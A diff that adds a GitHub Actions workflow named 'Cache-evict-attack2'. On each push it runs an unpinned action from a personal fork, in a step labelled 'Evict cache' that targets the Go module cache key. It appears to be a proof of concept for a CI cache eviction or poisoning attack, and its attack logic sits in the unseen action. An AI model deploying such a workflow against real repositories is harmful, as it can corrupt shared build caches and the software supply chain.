@@ -1,0 +1,25 @@
+name: Cache-evict-attack2
+
+on:
+  workflow_dispatch:
+  push:
+
+env:
+  GO_VERSION: "1.18"
+
+jobs:
+  reserve-cache:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v2
+        with:
+          fetch-depth: 0
+
+      - name: Evict cache
+        id: go-cache
+        uses: houdini91/cache@main
+        with:
+          path: |
+            ~/go/pkg/mod
+          key: ${{ runner.os }}-go-${{ env.GO_VERSION }}-${{ hashFiles('**/go.sum') }}
